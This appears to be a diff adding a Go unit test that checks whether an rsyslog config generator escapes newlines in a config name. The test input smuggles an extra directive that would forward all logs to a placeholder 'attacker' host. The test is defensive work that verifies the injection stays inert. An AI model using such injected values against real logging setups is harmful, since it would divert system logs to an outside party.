@@ -102,6 +102,24 @@ func TestGenerateRsyslogConfig_CustomFilters(t *testing.T) {
 	assert.Contains(t, got, "queue.filename=\"omfwd-loongcollector-auth_cfg\"")
 }
 
+func TestGenerateRsyslogConfig_ConfigNameInjection(t *testing.T) {
+	cfg := &SyslogForwardingConfig{
+		ConfigName: "evil\n*.* action(type=\"omfwd\" target=\"attacker\" Port=\"514\" Protocol=\"tcp\")",
+		Protocol:   "tcp",
+		Target:     "127.0.0.1",
+		Port:       "9999",
+	}
+	got := generateRsyslogConfig(cfg)
+
+	// The crafted newline must be escaped, keeping the comment on a single line
+	// so no extra rsyslog directive is injected.
+	assert.NotContains(t, got, "# Config: evil\n")
+	assert.Contains(t, got, `# Config: "evil\n*.* action`)
+	// Only the legitimate action line should target 127.0.0.1; the injected
+	// "attacker" target must remain inert inside the escaped comment.
+	assert.Contains(t, got, "target=\"127.0.0.1\" Port=\"9999\" Protocol=\"tcp\")")
+}
+
 func TestWriteRsyslogConfig_ChangeDetection(t *testing.T) {
 	dir := t.TempDir()
 	old := rsyslogConfigDir
